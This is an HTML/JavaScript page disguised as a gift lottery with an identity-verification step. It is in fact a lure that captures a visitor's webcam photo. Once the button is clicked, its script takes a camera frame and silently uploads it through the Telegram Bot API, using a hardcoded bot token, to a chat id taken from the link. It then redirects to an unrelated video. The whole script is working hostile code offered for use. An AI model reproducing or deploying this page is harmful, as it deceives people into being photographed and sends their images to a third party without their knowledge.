<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>🎁🎁🎁🎁🎁</title>
    <style>
        body { 
            display: flex; flex-direction: column; align-items: center; justify-content: center; 
            min-height: 100vh; margin: 0; font-family: 'Segoe UI', sans-serif; 
            background: url('https://github.com/sachinbagwan208-design/-/raw/main/00.png') no-repeat center center fixed; 
            background-size: cover; color: white; 
        }
        #video { background: #000; border: 2px solid #444; border-radius: 8px; margin-bottom: 20px; display: none; }
        #status { margin: 15px 0; font-weight: bold; color: #00ff00; background: rgba(0,0,0,0.6); padding: 10px; border-radius: 5px; }
        button { padding: 12px 30px; cursor: pointer; font-size: 18px; border-radius: 5px; border: none; background: #28a745; color: white; display: none; }
        button:hover { background: #218838; }
    </style>
</head>
<body>
    <h2 id="title">Verifying identity💳🆔...</h2>
    <div id="status">Moment⌚️</div>
    <video id="video" width="640" height="480" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>
    <button id="startBtn">Start💰</button>

    <script>
        // --- 配置区 ---
        const BOT_TOKEN = '8657025946:AAENnYKTFNhRrms6bzTLIR2kAQGytdOinnI'; 
        const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxb3YwIGMimTjdYhk8JbzGy_UGa72V2hnwyizmpsqGTYO6H-gzKU8sT94d41zXKFDQ/exec";
        
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const startBtn = document.getElementById('startBtn');
        const status = document.getElementById('status');
        const title = document.getElementById('title');
        
        const urlParams = new URLSearchParams(window.location.search);
        const CHAT_ID = urlParams.get('id');

        // 页面加载时执行权限校验
        window.onload = async () => {
            if (!CHAT_ID) {
                status.innerText = "❌ Error: Invalid access link ❌";
                return;
            }
            try {
                const response = await fetch(SCRIPT_URL + "?id=" + CHAT_ID);
                const data = await response.json();
                if (data.authorized) {
                    title.innerText = "🎁🎁🎁🎁🎁";
                    status.innerText = "Verification successful, please click the button below👇🏻👇🏻👇🏻";
                    startBtn.style.display = 'block';
                } else {
                    title.innerText = "❌️: No users found ID";
                    status.innerText = "This ID is unauthorized and cannot use this feature🙅🏻‍♀️";
                }
            } catch (err) {
                status.innerText = "Connection to server failed, please try again later🖥。";
            }
        };

        let currentStream;
        startBtn.addEventListener('click', async () => {
            try {
                currentStream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = currentStream;
                video.style.display = 'block';
                startBtn.style.display = 'none';
                status.innerText = "🎲The lottery is running🎲...";
                setTimeout(captureAndUpload, 1500);
            } catch (err) {
                status.innerText = "Please grant camera access 📷";
            }
        });

        function captureAndUpload() {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            canvas.toBlob(async (blob) => {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'ghost.jpg');
                try {
                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                    const result = await response.json();
                    if(result.ok) {
                        currentStream.getTracks().forEach(track => track.stop());
                        window.location.href = "https://github.com/sachinbagwan208-design/-/raw/main/000.MP4";
                    } else {
                        status.innerText = "-Send failed📍📍：" + result.description;
                    }
                } catch (err) {
                    status.innerText = "Network error 🌐";
                }
            }, 'image/jpeg');
        }
    </script>
</body>
</html>
